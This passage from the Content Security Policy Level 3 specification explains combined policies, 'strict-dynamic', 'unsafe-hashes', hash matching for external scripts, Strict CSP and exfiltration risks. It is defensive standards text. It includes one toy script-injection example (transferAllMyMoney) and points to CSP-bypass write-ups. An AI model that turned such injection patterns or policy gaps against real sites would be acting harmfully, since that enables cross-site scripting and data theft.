*This section is not normative.*

The above sections note that when multiple policies are present, each
must be enforced or reported, according to its type. An example will
help clarify how that ought to work in practice. The behavior of an
`XMLHttpRequest` might seem unclear given a site that, for whatever
reason, delivered the following HTTP headers:

Content-Security-Policy: default-src 'self' http://example.com http://example.net;
 connect-src 'none';
 Content-Security-Policy: connect-src http://example.com/;
 script-src http://example.com/

Is a connection to example.com allowed or not? The short answer is that
the connection is not allowed. Enforcing both policies means that a
potential connection would have to pass through both unscathed. Even
though the second policy would allow this connection, the first policy
contains `connect-src 'none'`, so its enforcement blocks the connection.
The impact is that adding additional policies to the list of policies to
enforce can *only* further restrict the capabilities of the protected
resource.

To demonstrate that further, consider a script tag on this page. The
first policy would lock scripts down to `'self'`, `http://example.com`
and `http://example.net` via the `default-src` directive. The second,
however, would only allow script from `http://example.com/`. Script will
only load if it meets both policy's criteria: in this case, the only
origin that can match is `http://example.com`, as both policies allow
it.

### 8.2. Usage of \"`'strict-dynamic'`\"

*This section is not normative.*

Host- and path-based policies are tough to get right, especially on
sprawling origins like CDNs. The [solutions to Cure53's H5SC
Minichallenge 3: \"Sh\*t, it's
CSP!\"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22#107-bytes)
[\[H5SC3\]](#biblio-h5sc3 "H5SC Minichallenge 3: "Sh*t, it's CSP!"")
are good examples of the kinds of bypasses which such policies can
enable, and though CSP is capable of mitigating these bypasses via
exhaustive declaration of specific resources, those lists end up being
brittle, awkward, and difficult to implement and maintain.

The
\"[`'strict-dynamic'`](#grammardef-strict-dynamic)\" source expression aims to make Content Security
Policy simpler to deploy for existing applications who have a high
degree of confidence in the scripts they load directly, but low
confidence in their ability to provide a reasonable list of resources to
load up front.

If present in a [`script-src`](#script-src) or [`default-src`](#default-src) directive, it has two main effects:

1. [host-source](#grammardef-host-source) and
 [scheme-source](#grammardef-scheme-source) expressions, as well as the
 \"[`'unsafe-inline'`](#grammardef-unsafe-inline)\" and
 \"[`'self'`](#grammardef-self)
 [keyword-source](#grammardef-keyword-source)s will be ignored when loading script.

 [hash-source](#grammardef-hash-source) and
 [nonce-source](#grammardef-nonce-source) expressions will be honored.

2. Script requests which are triggered by
 non-[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted)
 [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements are allowed.

The first change allows you to deploy
\"[`'strict-dynamic'`](#grammardef-strict-dynamic)\" in a backwards compatible way, without requiring
user-agent sniffing: the policy
`'unsafe-inline' https: 'nonce-abcdefg' 'strict-dynamic'` will act like
`'unsafe-inline' https:` in browsers that support CSP1,
`https: 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV'` in browsers that
support CSP2, and
`'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic'` in browsers
that support CSP3.

The second allows scripts which are given access to the page via nonces
or hashes to bring in their dependencies without adding them explicitly
to the page's policy.

Suppose MegaCorp, Inc. deploys the
following policy:

 Content-Security-Policy: script-src 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic'

And serves the following HTML with that policy active:

``` highlight
...
<script src="https://cdn.example.com/script.js" nonce="DhcnhD3khTMePgXwdayK9BsMqXjhguVV" ></script>
...
```

This will generate a request for `https://cdn.example.com/script.js`,
which will not be blocked because of the matching
[`nonce`](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce) attribute.

If `script.js` contains the following code:

``` highlight
var s = document.createElement('script');
s.src = 'https://othercdn.not-example.net/dependency.js';
document.head.appendChild(s);

document.write('<scr' + 'ipt src="/sadness.js"></scr' + 'ipt>');
```

`dependency.js` will load, as the
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) element created by `createElement()` is not
[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted).

`sadness.js` will *not* load, however, as `document.write()` produces
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements which are
[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted).

[\'strict-dynamic\'](#grammardef-strict-dynamic), scripts created at runtime will be allowed to
execute. If the location of such a script can be controlled by an
attacker, the policy will then allow the loading of arbitrary scripts.
Developers that use
[\'strict-dynamic\'](#grammardef-strict-dynamic) in their policy should audit the uses of
non-parser-inserted APIs and ensure that they are not invoked with
potentially untrusted data. This includes applications or frameworks
that tend to determine script locations at runtime.

### 8.3. Usage of \"`'unsafe-hashes'`\"

*This section is not normative.*

Legacy websites and websites with legacy dependencies might find it
difficult to entirely externalize event handlers. These sites could
enable such handlers by allowing `'unsafe-inline'`, but that's a big
hammer with a lot of associated risk (and cannot be used in conjunction
with nonces or hashes).

The
\"[`'unsafe-hashes'`](#grammardef-unsafe-hashes)\" source expression aims to make CSP deployment
simpler and safer in these situations by allowing developers to enable
specific handlers via hashes.

MegaCorp, Inc. can't quite get rid of
the following HTML on anything resembling a reasonable schedule:

``` highlight
<button id="action" onclick="doSubmit()">
```

Rather than reducing security by specifying \"`'unsafe-inline'`\", they
decide to use \"`'unsafe-hashes'`\" along with a hash source expression
corresponding to `doSubmit()`, as follows:

 Content-Security-Policy: script-src 'unsafe-hashes' 'sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY='

The capabilities `'unsafe-hashes'` provides is useful for legacy sites,
but should be avoided for modern sites. In particular, note that hashes
allow a particular script to execute, but do not ensure that it executes
in the way a developer intends. If an interesting capability is exposed
as an inline event handler (say
`<a onclick="transferAllMyMoney()">Transfer</a>`), then that script
becomes available for an attacker to inject as
`<script>transferAllMyMoney()</script>`. Developers should be careful to
balance the risk of allowing specific scripts to execute against the
deployment advantages that allowing inline event handlers might provide.

### 8.4. Allowing external JavaScript via hashes

*This section is not normative.*

In
[\[CSP2\]](#biblio-csp2 "Content Security Policy Level 2"),
hash [source
expressions](#source-expression) could only match inlined script, but now that
Subresource Integrity
[\[SRI\]](#biblio-sri "Subresource Integrity") is
widely deployed, we can expand the scope to enable externalized
JavaScript as well.

If multiple sets of integrity metadata are specified for a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script), the request will match a policy's
[hash-source](#grammardef-hash-source)s if and only if *each* item in a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script)'s integrity metadata matches the policy.

 The CSP spec specifies that the contents of an inline
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) element or event handler needs to be encoded using
[UTF-8
encode](https://encoding.spec.whatwg.org/#utf-8-encode) before computing its hash.
[\[SRI\]](#biblio-sri "Subresource Integrity")
computes the hash on the raw resource that is being fetched instead.
This means that it is possible for the hash needed to allow an inline
script block to be different from the hash needed to allow an external
script even if they have identical contents.

MegaCorp, Inc. wishes to allow two
specific scripts on a page in a way that ensures that the content
matches their expectations. They do so by setting the following policy:

 Content-Security-Policy: script-src 'sha256-abc123' 'sha512-321cba'

In the presence of that policy, the following
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements would be allowed to execute because they
contain only integrity metadata that matches the policy:

``` highlight
<script integrity="sha256-abc123" ...></script>
<script integrity="sha512-321cba" ...></script>
<script integrity="sha256-abc123 sha512-321cba" ...></script>
```

While the following
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements would not execute because they contain
valid metadata that does not match the policy (even though other
metadata does match):

``` highlight
<script integrity="sha384-xyz789" ...></script>
<script integrity="sha384-xyz789 sha512-321cba" ...></script>
<script integrity="sha256-abc123 sha384-xyz789 sha512-321cba" ...></script>
```

Metadata that is not recognized (either because it's entirely invalid,
or because it specifies a not-yet-supported hashing algorithm) does not
affect the behavior described here. That is, the following elements
would be allowed to execute in the presence of the above policy, as the
additional metadata is invalid and therefore wouldn't allow a script
whose content wasn't listed explicitly in the policy to execute:

``` highlight
<script integrity="sha256-abc123 sha1024-abcd" ...></script>
<script integrity="sha512-321cba entirely-invalid" ...></script>
<script integrity="sha256-abc123 not-a-hash-at-all sha512-321cba" ...></script>
```

### 8.5. Strict CSP

*This section is not normative.*

Deployment of an effective CSP against XSS is a challenge (as described
in [CSP Is Dead, Long Live
CSP!](https://dl.acm.org/doi/10.1145/2976749.2978363)
[\[LONG-LIVE-CSP\]](#biblio-long-live-csp "CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy")).
However, enforcing the following set of CSP directives has been
identified as an effective and deployable mitigation against XSS.

1. *script-src*: Only use *nonce*
 [source-expression](#grammardef-source-expression) and/or *hash*
 [source-expression](#grammardef-source-expression) with the
 \"[\'strict-dynamic\'](#grammardef-strict-dynamic)\"
 [keyword-source](#grammardef-keyword-source).

 While
 \"[\'strict-dynamic\'](#grammardef-strict-dynamic)\" allows ease of deployment (as described in
 [§ 8.2 Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage)), it
 should be avoided when possible.

 For backwards compatibility, it is recommended to
 specify *https:*
 [scheme-source](#grammardef-scheme-source) with
 \"[\'strict-dynamic\'](#grammardef-strict-dynamic)\".

2. *base-uri*: Specify a value of either
 \"[\'self\'](#grammardef-self)\" or
 \"[\'none\'](#grammardef-none)\".

A CSP that meets the above criteria is called Strict CSP. Further
details are discussed in
[\[WEBDEV-STRICTCSP\]](#biblio-webdev-strictcsp "Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)").

The following are examples of Strict
CSP:

Nonce-based Strict CSP:

 Content-Security-Policy: script-src 'strict-dynamic' 'nonce-{RANDOM}'; base-uri 'self';

Hash-based Strict CSP:

 Content-Security-Policy: script-src 'strict-dynamic' 'sha256-{HASHED_INLINE_SCRIPT}'; base-uri 'self';

### 8.6. Exfiltration

*This section is not normative.*

Data exfiltration can occur when the contents of the request, such as
the URL, contain information about the user or page that should be
restricted and not shared.

Content Security Policy can mitigate data exfiltration if used to create
allowlists of servers with which a page is allowed to communicate. Note
that a policy which lacks the
[default-src](#default-src)
directive cannot mitigate exfiltration, as there are kinds of requests
that are not addressable through a more-specific directive
([`prefetch`](https://html.spec.whatwg.org/#link-type-prefetch), for example).
[\[HTML\]](#biblio-html "HTML Standard")

In the following example, a policy
with draconian restrictions on images, fonts, and scripts can still
allow data exfiltration via other request types (`fetch()`,
[`prefetch`](https://html.spec.whatwg.org/#link-type-prefetch), etc):
[\[HTML\]](#biblio-html "HTML Standard")

 Content-Security-Policy: img-src 'none'; script-src 'none'; font-src 'none'

Supplementing this policy with `default-src 'none'` would improve the
page's robustness against this kind of attack.

In the following example, the
[default-src](#default-src)
directive appears to protect from exfiltration, however the
[img-src](#img-src) directive relaxes
this restriction by using a wildcard, which allows data exfiltration to
arbitrary endpoints. A policy's exfiltration mitigation ability depends
upon the least-restrictive directive allowlist:

 Content-Security-Policy: default-src 'none'; img-src *

## 9. Implementation Considerations

### 9.1. Vendor-specific Extensions and Addons

[Policy](#content-security-policy-object) enforced on a resource SHOULD NOT interfere with the
operation of user-agent features like addons, extensions, or
bookmarklets. These kinds of features generally advance the user's
priority over page authors, as espoused in
[\[HTML-DESIGN\]](#biblio-html-design "HTML Design Principles").

Moreover, applying CSP to these kinds of features produces a substantial
amount of noise in violation reports, significantly reducing their value
to developers.

Chrome, for example, excludes the `chrome-extension:` scheme from CSP
checks, and does some work to ensure that extension-driven injections
are allowed, regardless of a page's policy.

## 10. IANA Considerations

### 10.1. Directive Registry

The Content Security Policy Directive registry should be updated with
the following directives and references
[\[RFC7762\]](#biblio-rfc7762 "Initial Assignment for the Content Security Policy Directives Registry"):

[`base-uri`](#base-uri)

: This document (see [§ 6.3.1 base-uri](#directive-base-uri))

[`child-src`](#child-src)

: This document (see [§ 6.1.1 child-src](#directive-child-src))

[`connect-src`](#connect-src)

: This document (see [§ 6.1.2 connect-src](#directive-connect-src))

[`default-src`](#default-src)

: This document (see [§ 6.1.3 default-src](#directive-default-src))

[`font-src`](#font-src)

: This document (see [§ 6.1.4 font-src](#directive-font-src))

[`form-action`](#form-action)

: This document (see [§ 6.4.1 form-action](#directive-form-action))

[`frame-ancestors`](#frame-ancestors)

: This document (see [§ 6.4.2
 frame-ancestors](#directive-frame-ancestors))

[`frame-src`](#frame-src)

: This document (see [§ 6.1.5 frame-src](#directive-frame-src))

[`img-src`](#img-src)

: This document (see [§ 6.1.6 img-src](#directive-img-src))

[`manifest-src`](#manifest-src)

: This document (see [§ 6.1.7 manifest-src](#directive-manifest-src))

[`media-src`](#media-src)

: This document (see [§ 6.1.8 media-src](#directive-media-src))

[`object-src`](#object-src)

: This document (see [§ 6.1.9 object-src](#directive-object-src))

[`report-uri`](#report-uri)

: This document (see [§ 6.5.1 report-uri](#directive-report-uri))

[`report-to`](#report-to)

: This document (see [§ 6.5.2 report-to](#directive-report-to))

[`sandbox`](#sandbox)

: This document (see [§ 6.3.2 sandbox](#directive-sandbox))

[`script-src`](#script-src)

: This document (see [§ 6.1.10 script-src](#directive-script-src))

[`script-src-attr`](#script-src-attr)

: This document (see [§ 6.1.12
 script-src-attr](#directive-script-src-attr))

[`script-src-elem`](#script-src-elem)

: This document (see [§ 6.1.11
 script-src-elem](#directive-script-src-elem))

[`style-src`](#style-src)

: This document (see [§ 6.1.13 style-src](#directive-style-src))

[`style-src-attr`](#style-src-attr)

: This document (see [§ 6.1.15
 style-src-attr](#directive-style-src-attr))

[`style-src-elem`](#style-src-elem)

: This document (see [§ 6.1.14
 style-src-elem](#directive-style-src-elem))

[`worker-src`](#worker-src)

: This document (see [§ 6.2.2 worker-src](#directive-worker-src))

### 10.2. Headers

The permanent message header field registry should be updated with the
following registrations:
[\[RFC3864\]](#biblio-rfc3864 "Registration Procedures for Message Header Fields")

#### 10.2.1. Content-Security-Policy

Header field name
: Content-Security-Policy

Applicable protocol
: http

Status
: standard

Author/Change controller
: W3C

Specification document
: This specification (See [§ 3.1 The Content-Security-Policy HTTP
 Response Header Field](#csp-header))

#### 10.2.2. Content-Security-Policy-Report-Only

Header field name
: Content-Security-Policy-Report-Only

Applicable protocol
: http

Status
: standard

Author/Change controller
: W3C

Specification document
: This specification (See [§ 3.2 The
 Content-Security-Policy-Report-Only HTTP Response Header
 Field](#cspro-header))

## 11. Acknowledgements

Lots of people are awesome. For instance:

- Mario and all of Cure53.

- Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, Jochen Eisinger,
 and the rest of Google's CSP Cabal.
